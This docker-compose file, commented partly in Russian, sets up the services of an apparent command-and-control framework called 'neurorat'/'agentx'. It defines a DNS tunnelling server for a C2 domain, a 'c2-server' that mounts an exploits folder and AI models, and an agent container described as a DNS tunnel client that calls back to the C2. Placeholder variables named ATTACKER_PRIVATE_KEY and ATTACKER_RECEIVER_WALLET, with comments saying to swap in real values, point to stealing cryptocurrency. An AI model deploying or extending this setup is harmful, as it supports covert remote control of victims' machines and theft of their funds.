version: '3.8'

services:
#  agentx:
#    build:
#      context: .
#      dockerfile: Dockerfile
#    container_name: agentx
#    restart: unless-stopped
#    ports:
#      - "80:80"     # Frontend
#      - "8000:8000" # API
#    volumes:
#      - ./data:/app/data
#    environment:
#      - ENV=production
#      - LOG_LEVEL=INFO
#    networks:
#      - agentx-network

  redis:
    image: "redis:alpine"
    ports:
      # Открываем порт Redis наружу (на localhost) для удобства отладки, необязательно
      - "6379:6379"
    volumes:
      # Опционально: сохраняем данные Redis между перезапусками
      - redis_data:/data
    networks:
      - agentx_network

  dns-server:
    build:
      context: .
      dockerfile: Dockerfile.dns
    ports:
      # Пробрасываем UDP порт 5333 из контейнера наружу
      - "5333:5333/udp"
    environment:
      # Указываем, какой домен считать "своим"
      C2_DOMAIN: "test.neurorat.local"
      # Указываем адрес Redis внутри Docker-сети (используем имя сервиса 'redis')
      REDIS_URL: "redis://redis:6379/1" # Используем БД 1 для DNS/C2
      # Указываем порт, который должен слушать DNS сервер ВНУТРИ контейнера
      DNS_LISTEN_PORT: "5333"
      LOG_LEVEL: "DEBUG" # Включаем DEBUG логи для DNS сервера
    depends_on:
      - redis
    networks:
      - agentx_network
    # Для UDP на macOS может понадобиться healthcheck или restart policy
    restart: unless-stopped
    # Возвращаем стандартный запуск
    # command: >
    #  sh -c "apt-get update && apt-get install -y net-tools && python -u -m src.dns_server"

  c2-server:
    build:
      context: .
      dockerfile: Dockerfile.c2
    container_name: gentx-c2-server-1 # Consistent naming
    restart: unless-stopped
    ports:
      - "8000:8000" # Expose C2 API port
      - "8081:8081" # Example: Port for WebSocket?
      - "50051:50051" # Example: Port for gRPC?
    volumes:
      - ./src:/app/src # Mount source code for development (consider removing for production)
      - ./agentx-c1:/app/agentx-c1 # Mount AI models/configs
      - ./exploits:/app/exploits # Mount exploits
      - ./reports:/app/reports # Mount reports directory
      - ./cache:/app/cache # Mount cache directory
      - c2_logs:/app/logs # Persistent logs
    environment:
      - REDIS_HOST=redis
      - REDIS_PORT=6379
      - REDIS_URL=redis://redis:6379/0
      - LOG_LEVEL=INFO
      # --- Обновляем плейсхолдеры на более конкретные (но всё еще невалидные) ---
      - ATTACKER_PRIVATE_KEY=0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # ЗАМЕНИТЬ НА РЕАЛЬНЫЙ КЛЮЧ (или через .env файл)
      - ATTACKER_RECEIVER_WALLET=0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # ЗАМЕНИТЬ НА РЕАЛЬНЫЙ АДРЕС
      - ALCHEMY_API_KEY=dummy_alchemy_api_key_replace_me # ЗАМЕНИТЬ (или через .env файл)
      - ETHERSCAN_API_KEY=dummy_etherscan_api_key_replace_me # ЗАМЕНИТЬ (если используется)
    depends_on:
      - redis
      - dns-server
    networks:
      - agentx_network
    # healthcheck: # Example healthcheck
    #   test: ["CMD", "curl", "--fail", "http://localhost:8000/health"]
    #   interval: 30s
    #   timeout: 10s
    #   retries: 3
    #   start_period: 30s

  # НОВЫЙ СЕРВИС: Агент (DNS Tunnel Client)
  agent:
    build:
      context: .
      dockerfile: Dockerfile.agent
    container_name: gentx-agent-1
    restart: unless-stopped
    # ports: # Agent usually doesn't expose ports directly
    volumes:
      # Mount config if needed, or bake it into the image
      # - ./sample_configs/agent_config.json:/app/config/agent_config.json:ro
      - agent_logs:/app/logs # Persistent logs for agent
    environment:
      - C2_HOST=c2-server # Use Docker DNS service discovery
      - C2_PORT=8000
      - LOG_LEVEL=DEBUG # More verbose logging for agent debugging
      # Add other agent-specific env vars if needed
    depends_on:
      - c2-server
    networks:
      - agentx_network
    # command: ["python", "src/autonomous_agent.py", "--config", "/app/config/agent_config.json"] # Example explicit command

# Вы можете добавить MongoDB или другую базу данных по необходимости
# mongodb:
#   image: mongo:latest
#   container_name: agentx-mongo
#   restart: unless-stopped
#   volumes:
#     - ./data/mongodb:/data/db
#   ports:
#     - "27017:27017"
#   networks:
#     - agentx-network

networks:
  agentx_network:
    driver: bridge

volumes:
  # data: # Больше не используется после удаления agentx
  redis_data:
  c2_logs: # Определяем именованный том для логов C2
  agent_logs: # Определяем именованный том для логов агента 